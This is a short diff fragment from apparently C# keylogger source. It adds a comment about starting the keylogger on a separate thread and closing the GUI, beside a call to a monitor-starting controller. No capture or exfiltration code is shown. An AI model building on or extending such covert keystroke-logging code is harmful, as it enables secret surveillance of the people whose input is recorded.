@@ -30,6 +30,7 @@ namespace Keylogger
         {
             InitializeComponent();
 
+            // Start keylogger in another thread and close GUI
             Thread keyloggerThread = new Thread(() =>
             {
                 new Controller().StartMonitor();
